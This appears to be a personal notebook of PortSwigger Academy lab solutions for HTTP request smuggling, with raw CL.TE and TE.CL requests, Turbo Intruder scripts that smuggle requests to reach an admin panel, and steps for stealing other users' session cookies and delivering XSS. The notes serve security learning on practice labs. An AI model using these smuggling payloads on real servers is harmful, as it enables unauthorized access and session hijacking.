        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20306.png)
        
    - http 1
        - few labs video solution)
            
            [https://www.youtube.com/watch?v=cLunULYbsdY](https://www.youtube.com/watch?v=cLunULYbsdY)
            
        - HTTP request smuggling, basic CL.TE vulnerability
            - lab link and description
                
                [https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te) 
                
                To solve the lab, smuggle a request to the back-end server, 
                so that the next request processed by the back-end server appears to use the method `GPOST`.
                
            - Manually fixing the length fields in request smuggling attacks can be tricky (because u must also include end of life sequence represented by`\r\n`
            - so i used the “[HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp extension”
                
                repeater > extensions > … > lunch all scans
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20307.png)
                
            - the extension sends 2 requests that generates the sending of the method “GPOST” and solved the lab.
                - request 1
                    
                    ```html
                    POST / HTTP/1.1
                    Host: 0a80005404b30ccec4289c9c00ce0085.web-security-academy.net
                    Cookie: session=8rM9dOI8otNTnuiFah9gVsgsHMTsz0Q2
                    Cache-Control: max-age=0
                    Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
                    Sec-Ch-Ua-Mobile: ?0
                    Sec-Ch-Ua-Platform: "Linux"
                    Upgrade-Insecure-Requests: 1
                    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
                    Sec-Fetch-Site: none
                    Sec-Fetch-Mode: navigate
                    Sec-Fetch-User: ?1
                    Sec-Fetch-Dest: document
                    Accept-Encoding: gzip, deflate
                    Accept-Language: en-US,en;q=0.9
                    Content-Type: application/x-www-form-urlencoded
                    Content-Length: 14
                    tRANSFER-ENCODING: chunked
                    Connection: close
                    
                    3
                    w=w
                    0
                    
                    G
                    ```
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20308.png)
                    
                - request2
                    
                    ```html
                    POST / HTTP/1.1
                    Host: 0a80005404b30ccec4289c9c00ce0085.web-security-academy.net
                    Cookie: session=8rM9dOI8otNTnuiFah9gVsgsHMTsz0Q2
                    Cache-Control: max-age=0
                    Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
                    Sec-Ch-Ua-Mobile: ?0
                    Sec-Ch-Ua-Platform: "Linux"
                    Upgrade-Insecure-Requests: 1
                    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
                    Sec-Fetch-Site: none
                    Sec-Fetch-Mode: navigate
                    Sec-Fetch-User: ?1
                    Sec-Fetch-Dest: document
                    Accept-Encoding: gzip, deflate
                    Accept-Language: en-US,en;q=0.9
                    Content-Type: application/x-www-form-urlencoded
                    Content-Length: 13
                    tRANSFER-ENCODING: chunked
                    Connection: close
                    
                    3
                    w=w
                    0
                    ```
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20309.png)
                    
            - How to reproduce this yourself
                - go the request in burp scanner, right click, smuggle attack  (CL,TE)
                    - this will use burp intruder to send the requests  and maximize the chances that the 2 necessary requests are being sent consecutive
                    - This is important because in real world it can be hard to do request smuggling since the website gets thousands of requests coming at the same time
                    - change the prefix to G ( or any prefix that you want)
                        
                        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20310.png)
                        
                        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20311.png)
                        
                    - you can reproduce this manually using simply repeater
                        
                        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20312.png)
                        
                        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20313.png)
                        
        - HTTP request smuggling, basic TE.CL vulnerability
            - same thing as the same lab here, we can use “smuggle probe” or “lunch all scans”  in the extension to find the bug
            - next, we use “probe TE,CL” for using intruder ( this option only appears if u right click from the request in issy activity )
                - like said by tribus in youtube, the requests in burp intruder doesn’t arrive in the order they show you, probably 7 before 6 or smt like that
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20314.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20315.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20316.png)
                
            - increase the thread pool size to make it faster
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20317.png)
                
            - an idea on how to do it manually
                - more explanation in the video, even tho it didn’t work for him
                - basically u need to click the `\r` button in burp repeater
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20318.png)
                    
                - look for a way to disable updating the content length  (it’s a setting in the repeater tab)
                - like in the course, use a content-length of 3 (\r \n and 3, so 3 characters/bytes)
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20319.png)
                    
                - You need to include the trailing sequence `\r\n\r\n` following the final `0`
                - the idea is that the content of the victim’s request gets injected the body of the second request that we make
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20320.png)
                    
            - Weirdly, even tho i got the intended response, i tried few times before i saw the congrats message
                
                The  response should say: `Unrecognized method GPOST`.
                
        - HTTP request smuggling, obfuscating the TE header
            - Here, one of the two servers would interpret “chunked” header, and the other doesn’t because it’s obfuscated and it didn’t recognize it
            - we should use HTTP/1.1  before lunching the scanner (this attacks didn’t work for me with http2)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20321.png)
                
            - the permute things that you see in the extension are  different ways to put the transfer encoding header
                - for example: using space or tab before chunked
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20322.png)
                
            - the results of the scan shows that it’s TE,CL
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20323.png)
                
            - we go to the issue having “invalid method” in the response
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20324.png)
                
            - i used Request 1, right click, extensions,… , smuggle attack (TE,CL)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20325.png)
                
            - we modify the prefix
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20326.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20327.png)
                
        - HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
            - theory part
                
                [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
                
            - Apparently repeater switches to http2 automatically and these vulnerabilities can be exploited with http1.1
            - so i lunched the scans with the extension and the chosen the issue that uses http 1.1 (it’s also the exact issue we have CL.TE)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20328.png)
                
            - then right click > extensions > smuggler, smuggler attack (CL,TE) and modified the prefix
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20329.png)
                
            - lunch the attack to solve the lab
        - HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
            - theory
                
                [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
                
            - like the previous lab, we use the extension and burp intruder
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20330.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20331.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20332.png)
                
        - Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
            - theory part
                
                [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
                
            - lab link with detailed solution
                
                [https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)
                
            - we use the extension to lunch a “smuggle attack (CL,TE)” to access `/admin`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20333.png)
                
            - try to lunch the attack from an issue activity request where the last response is not a server error
            - you may break the web app by testing and you will have to wait few minutes then
            - the smuggling works but we get the following error
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20334.png)
                
            - so we should change our payload. Below is 2 ways to do this
            - so we update turbo intruder, knowing that using duplicate headers are not allowed (according to errors)
                - code of method 1
                    
                    ```python
                    def queueRequests(target, wordlists):
                        engine = RequestEngine(endpoint=target.endpoint,
                                               concurrentConnections=5,
                                               requestsPerConnection=1,
                                               resumeSSL=False,
                                               timeout=10,
                                               pipeline=False,
                                               engine=Engine.THREADED,
                                               maxRetriesPerRequest=0
                                               )
                        # This will prefix the victim's request. Edit it to achieve the desired effect.
                        prefix = '''GET /admin HTTP/1.1
                    HOST:localhost
                    Accept: */*
                    Connection: Close
                    
                    GET / HTTP/1.1
                    FOO:e'''
                    
                        # HTTP uses \r\n for line-endings. Linux uses \n so we need to normalise
                        if '\r' not in prefix:
                            prefix = prefix.replace('\n', '\r\n')
                    
                        # The request engine will auto-fix the content-length for us
                        attack = target.req + prefix
                        victim = target.req
                    
                        while True:
                    
                            engine.queue(attack)
                            for i in range(4):
                                engine.queue(victim)
                                time.sleep(0.05)
                            time.sleep(1)
                    
                    def handleResponse(req, interesting):
                        table.add(req)
                    ```
                    
                - screenshot of code method 2 (more concise)
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20335.png)
                    
            - this enables us to see the content of `/admin`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20336.png)
                
            - Using this content, we replace `/admin` with `/admin/delete?username=carlos` and solve the lab
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20337.png)
                
        - Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
            - the same idea and payloads as the previous lab
                - payload 1
                    
                    ```python
                    GET /admin/delete?username=carlos HTTP/1.1
                    HOST:localhost
                    Accept: */*
                    Connection: Close
                    
                    GET / HTTP/1.1
                    FOO:e
                    ```
                    
                - payload 2
                    
                    ```python
                    # This will prefix the victim's request. Edit it to achieve the desired effect.
                        prefix = '''GET /admin HTTP/1.1
                    Host: localhost
                    Content-Type: application/x-www-form-urlencoded
                    Content-Length: 15
                    
                    x='''
                    ```
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20338.png)
                    
            - it’s important to give your attack time, grepping on “Carlos” in the output of “GET /admin” was successfull until the request 15
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20339.png)
                
            - after confirming the vulnerability, we update the code in burp intruder with the payload above to solve the lab
            - sometimes, you just need to lunch burp intruder a second time for the attack to work
        - Exploiting HTTP request smuggling to reveal front-end request rewriting
            - lab link
                
                [https://0a9300a2046494f881e93e7200200082.web-security-academy.net/](https://0a9300a2046494f881e93e7200200082.web-security-academy.net/)
                
            - we start by finding a POST request that reflects the value of a request parameter into the application's response.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20340.png)
                
            - Next, using the extension, we edit the CT,TE smuggling payload to view the headers which gets added to the requests
                
                ```python
                    prefix = '''POST / HTTP/1.1
                Host: 0a9300a2046494f881e93e7200200082.web-security-academy.net
                Content-Type: application/x-www-form-urlencoded
                Content-Length: 100
                
                search='''
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20341.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20342.png)
                
            - using `Content-Length:100` was enough to get the header that we want. In the solution, they used `200` which allows to see more headers.
            - we can’t add that header directly because we’ll get the following error
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20343.png)
                
            - that’s why they said in the description to smuggle a request to the back-end server that includes the added header
            - so, we use smuggling to send a request to the back-end in the endpoint `/admin` after adding the header `X-Wltuwa-Ip: 127.0.0.1`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20344.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20345.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20346.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20347.png)
                
            - sometimes you have to run intruder twice for your attack to work or let it run for more than 30 requests
        - Exploiting HTTP request smuggling to capture other users' requests
            - lab link
                
                [https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)
                
            - manual exploitation
                - while some servers do not support the Transfer-Encoding header in requests, all of them support content-length
                - that’s why we can smuggle the second request
                
                check 1:20:00 in the following video
                
                [https://www.youtube.com/watch?v=cLunULYbsdY&t=4729s](https://www.youtube.com/watch?v=cLunULYbsdY&t=4729s)
                
            - we find a feature that allows to save and retrieve data (the comment feature) and copy the CSRF token
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20348.png)
                
            - Next, we try to smuggle a request to the back-end server that causes the next user's request to be stored in the application.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20349.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20350.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20351.png)
                
            - i didn’t retrieve the full request so i kept increasing the content-length
                - i knew it was the victim’s request because i use the cookie just after the host header + it contained the word victim as a hint + i should get a different cookie value + we can add a custom cookie to make it easy to spot the difference like secret=IamSuperman
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20352.png)
                
            - until i was able to get the content of the session cookie in the victim’s request
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20353.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20354.png)
                
            - we use the new session cookie to access “My account” and solve the lab
        - Exploiting HTTP request smuggling to deliver reflected XSS
            - lab link
                
                [https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)
                
            - we confirm that the application is also vulnerable to reflected XSS via the User-Agent header.
                - Notice that the value of the User-agent gets reflected in the following request
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20355.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20356.png)
                
            - Next, we smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes `alert(1)`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20357.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20358.png)
                
        - CL.0 request smuggling
            - lab link
                
                [https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling)
                
            - video solution
                
                [https://www.youtube.com/watch?v=YECTiaug1Fc](https://www.youtube.com/watch?v=YECTiaug1Fc)
                
            - this situation happens when the backend server ignores the Content-Length header
            - we create the first request which contains a GET in the body and `Connection: keep-alive`
                - the content-length will get up updated automatically (it has to be correct)
                - make sure there is no line 10 so that the request gets added to line 9
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20359.png)
                
            - the backend is not expecting the request to have a body and interprets it as the start of a new request
            - the second request is a simple GET
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20360.png)
                
            - add tab to group > create tab group (in the correct order)  > in orange button choose : send group (single connection)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20361.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20362.png)
                
            - As you can see, this didn’t work since the server responded to the second request as normal, this means that the endpoint in the first request is not vulnerable to CL.0
            - so we switch to using  static resource in the first request (that we get from burp history, the request has to return content and not 404)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20363.png)
                
            - because the backend is probably not gonna expect a static resource to have a content-length header
            - so we update the first request with a static resource. This works !
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20364.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20365.png)
                
            - Next, we smuggle a request to the back-end to access to the admin panel at `/admin`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20366.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20367.png)
                
            - we do the same to delete the user `carlos`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20368.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20369.png)
                
    - http 2
        - using burp with http2 tips
            
            [https://portswigger.net/burp/documentation/desktop/http2](https://portswigger.net/burp/documentation/desktop/http2)
            
            - To force Burp Repeater to use HTTP/2 so that you can test for this misconfiguration manually:
                1. From the **Settings** dialog, go to **Tools > Repeater**.
                2. Under **Connections**, enable the **Allow HTTP/2 ALPN override** option.
                3. In Repeater, go to the **Inspector** panel and expand the **Request attributes** section.
                4. Use the switch to set the **Protocol** to **HTTP/2**. Burp will now send all requests on this tab using HTTP/2, regardless of whether the server advertises support for this.
        - H2.CL request smuggling
            - lab link
                
                [https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling)
                
            - video solution
                
                [https://www.youtube.com/watch?v=P6SkfSesJsk](https://www.youtube.com/watch?v=P6SkfSesJsk)
                
            - we use the extension “lunch all scans” . It was helpful to know there is a bug but it didn’t help me exploit it. it didn’t mention H2,CL
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20370.png)
                
            - FYI `smuggle probe` is for Http 1, while `Http/2 probe`  is for http 2
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20371.png)
                
            - if we send the following request few times (crtl+ enter) we’ll get get a 404 indicating that the smuggling an arbitrary prefix worked by including a `Content-Length: 0`
                - Remember to expand the Inspector's **Request Attributes** section and make sure the protocol is set to HTTP/2 before sending the request.
                - Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20372.png)
                
            - this is link of the technique we’re trying to use here.
                - it’s a behavior in some apps where they perform on-site redirects from one URL to another and place the hostname from the request's `Host` header into the redirect URL.
                - It’s the default behavior of Apache and IIS web servers
                
                [https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect)
                
            - notice that if you send a request for `GET /resources`, you are redirected to `https://YOUR-LAB-ID.web-security-academy.net/resources/`.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20373.png)
                
            - if we smuggle a request pointing to `/resources`  with an arbitrary host, we’ll get redirected too (it has to be an endpoint that trigger 302 in the app like /resources in this case)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20374.png)
                
            - We go to the exploit server and change the file path to `/resources`. In the body, enter the payload `alert(document.cookie)`, then store the exploit.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20375.png)
                
            - Then, we change the host header with the exploit server’s domain to solve the lab
                - using 10 in Content-Length was too much, i used 5 to solve the lab  (so use a small Content-Length to avoid problems)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20376.png)
                
        - Response queue poisoning via H2.TE request smuggling
            - lab link
                
                [https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
                
            - course part link
                
                [https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning)
                
            - video solution
                
                [https://www.youtube.com/watch?v=cGB-QNDySTs](https://www.youtube.com/watch?v=cGB-QNDySTs)
                
            - we start by smuggling an arbitrary prefix in the body of an HTTP/2 request.
                - After sending a request twice we get a 404
                - Make sure there is no typos when it comes to important headers like  `Transfer-Encoding: chunked`
                - there should be one line break between and not 2  before and after the 0
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20377.png)
                
            - Next, we’ll do a poc to show we can smuggle another request (this step is optional)
                - make sure there is no empty line after line 9
                - first request
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20378.png)
                    
                - second request :
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20379.png)
                    
            - To make it easier to differentiate stolen responses from responses to your own requests, try using a non-existent path in both of the requests that you send.
                - That way, your own requests should consistently receive a 404 response, for example.
                - Remember to terminate the smuggled request properly by including the sequence `\r\n\r\n` after the `Host` header.
                - this is equivalent to 2 line breaks after the header `Host` !! (that’s why we have line 11 in repeater)
                
                ```python
                POST /x HTTP/2
                Host: 0ad4009104851f4a80fe5370009700de.web-security-academy.net
                User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
                Transfer-Encoding: chunked
                
                0
                
                GET /x HTTP/1.1
                Host: 0ad4009104851f4a80fe5370009700de.web-security-academy.net
                
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20380.png)
                
            - An admin user will log in approximately every 15 seconds. So, the goal is to get the the cookie from the response.
            - you may get lucky like in the video solution and get it to work using only repeater.
            - This wasn’t the case for me, so i used intruder
                - An admin user will log in approximately every 15 seconds. So i set intruder to send a request every 5 seconds or 10 seconds.
                - i filtered the responses to only see redirection responses
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20381.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20382.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20383.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20384.png)
                
            - we use the cookie to solve the lab
        - HTTP/2 request smuggling via CRLF injection
            - lab link
                
                [https://0a7d003304c4514a82b3753d0050005c.web-security-academy.net/](https://0a7d003304c4514a82b3753d0050005c.web-security-academy.net/login)
                
            - make sure repeater’s settings looks like this
                - we are concerned by the first and and last setting (alpn and content-length)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20385.png)
                
            - Notice that the application search feature reflect’s to store the user’s input which is useful in exploitation (like we saw in ‘Capturing other users' requests’ lab )
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20386.png)
                
            - Send the most recent `POST /` request to Burp Repeater and remove your session cookie before resending the request.
            - Notice that your search history is reset, confirming that it's tied to your session cookie.
            - unlike the extension, we find out that we have HTTP/2 TE desync
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20387.png)
                
            - Unlike the previous lab, we can’t use  `Transfer-Encoding: chunked` directly
                - the response didn’t change after sending this request many times
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20388.png)
                
            - this suggests that the website is probably stripping any `transfer-encoding` headers
            - in this case, we can use the HTTP/2 view in the Inspector to inject a CRLF (`\r\n`)
                
                ```python
                
                POST / HTTP/1.1
                Host: 0a2b00c60356763a80ca94e60012008b.web-security-academy.net
                Foo: bar
                
                0
                
                aaaaaaa
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20389.png)
                
                - to inject a line break, use `shift + return` keys
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20390.png)
                
                - after clicking on Apply changes, we get the following message :
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20391.png)
                
                - Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix
            - Now, when we click on home, we can see the response of the previous request, which is the search request
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20392.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20393.png)
                
            - we update the smuggled request to use the search feature in order to save the victim’s response
                - ideally, we should send the request, then the victim should send the next request which will get saved
                - the victim sends a request every 15 seconds so if you see that it’s your own request that got saved, try waiting for 15 seconds and re-send the request
                - make sure that you include your cookie in the smuggled request in order to be able to see the victim’s response in your recent searches
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20394.png)
                
                - after sending the POST, we check if we got lucky and got the victim’s request by sending a GET, otherwise we retry after 15s
                - if you take forever to do the GET, you may loose the search history (from what i understood)
                - that’s why in the solution, they say you have to check immediately after sending the POST
                - as u can see i was unlucky here because the content-length wasn’t enough
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20395.png)
                    
                - using the following content-Length i was able to get the victim’s cookie :
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20396.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20397.png)
                
            - using the found cookie, we solve the lab
        - HTTP/2 request splitting via CRLF injection
            - lab link
                
                [https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
                
            - video solution
                
                [https://www.youtube.com/watch?v=EctS4hpqSjw](https://www.youtube.com/watch?v=EctS4hpqSjw)
                
                [https://www.youtube.com/watch?v=LDUJh_8H_OM](https://www.youtube.com/watch?v=LDUJh_8H_OM)
                
